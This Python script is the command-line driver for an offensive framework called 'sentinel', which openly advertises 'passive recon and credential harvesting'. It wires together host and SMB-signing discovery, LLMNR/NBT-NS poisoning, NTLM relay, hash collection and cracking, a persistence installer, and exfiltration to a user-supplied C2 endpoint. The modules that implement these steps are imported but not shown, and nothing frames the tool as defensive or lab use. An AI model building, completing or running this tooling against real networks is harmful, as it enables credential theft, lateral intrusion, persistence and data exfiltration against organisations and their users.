#!/usr/bin/env python3
"""
sentinel — passive internal recon and credential harvesting framework
"""

import argparse
import asyncio
import logging
import sys
import os
from pathlib import Path
from datetime import datetime

from modules.recon import ReconEngine
from modules.poison import PoisonEngine
from modules.relay import RelayEngine
from modules.harvest import HarvestEngine
from modules.persist import PersistEngine
from modules.exfil import ExfilEngine

VERSION = "1.0.0"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(f"sentinel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    ]
)
log = logging.getLogger("sentinel")


def banner():
    print(r"""
  ___ ___ _  _ _____ ___ _  _ ___ _    
 / __| __| \| |_   _|_ _| \| | __| |   
 \__ \ _|| .` | | |  | || .` | _|| |__ 
 |___/___|_|\_| |_| |___|_|\_|___|____|
                                        
 passive recon + credential harvesting
 """)


def parse_args():
    parser = argparse.ArgumentParser(
        description="sentinel — internal network recon framework",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", help="Target subnet (CIDR) or host")
    parser.add_argument("--iface", default="eth0", help="Network interface")
    parser.add_argument("--mode", choices=["passive", "aggressive", "harvest", "persist", "exfil"],
                        default="passive")
    parser.add_argument("--relay", action="store_true", help="Enable NTLM relay")
    parser.add_argument("--poison", action="store_true", help="Enable LLMNR/NBT-NS poisoning")
    parser.add_argument("--wordlist", help="Wordlist for hash cracking")
    parser.add_argument("--output", default="./output", help="Output directory")
    parser.add_argument("--c2", help="C2 endpoint for exfil")
    parser.add_argument("--verbose", "-v", action="store_true")
    return parser.parse_args()


async def run_passive(args, output_dir):
    log.info("starting passive recon")
    recon = ReconEngine(args.target, args.iface, output_dir)
    hosts = await recon.discover_hosts()
    log.info(f"discovered {len(hosts)} live hosts")
    
    services = await recon.fingerprint_services(hosts)
    log.info(f"fingerprinted {sum(len(v) for v in services.values())} services")
    
    smb_hosts = [h for h, s in services.items() if 445 in s or 139 in s]
    log.info(f"SMB hosts: {smb_hosts}")
    
    signing_disabled = await recon.check_smb_signing(smb_hosts)
    log.info(f"SMB signing disabled on: {signing_disabled}")
    
    recon.save_report(hosts, services, signing_disabled)
    return hosts, services, signing_disabled


async def run_aggressive(args, output_dir):
    hosts, services, signing_disabled = await run_passive(args, output_dir)
    
    tasks = []
    
    if args.poison:
        poison = PoisonEngine(args.iface, output_dir)
        tasks.append(poison.start())
    
    if args.relay and signing_disabled:
        relay = RelayEngine(signing_disabled, output_dir)
        tasks.append(relay.start())
    
    if tasks:
        await asyncio.gather(*tasks)


async def run_harvest(args, output_dir):
    harvest = HarvestEngine(output_dir, args.wordlist)
    hashes = harvest.collect_hashes()
    log.info(f"collected {len(hashes)} hashes")
    
    if args.wordlist:
        cracked = await harvest.crack_hashes(hashes)
        log.info(f"cracked {len(cracked)} hashes")
        harvest.save_credentials(cracked)
    
    return hashes


async def main():
    banner()
    args = parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    log.info(f"sentinel v{VERSION} starting")
    log.info(f"mode: {args.mode} | target: {args.target} | iface: {args.iface}")
    
    if args.mode == "passive":
        await run_passive(args, output_dir)
    elif args.mode == "aggressive":
        await run_aggressive(args, output_dir)
    elif args.mode == "harvest":
        await run_harvest(args, output_dir)
    elif args.mode == "persist":
        persist = PersistEngine(output_dir)
        persist.install()
    elif args.mode == "exfil":
        exfil = ExfilEngine(args.c2, output_dir)
        await exfil.run()


if __name__ == "__main__":
    asyncio.run(main())
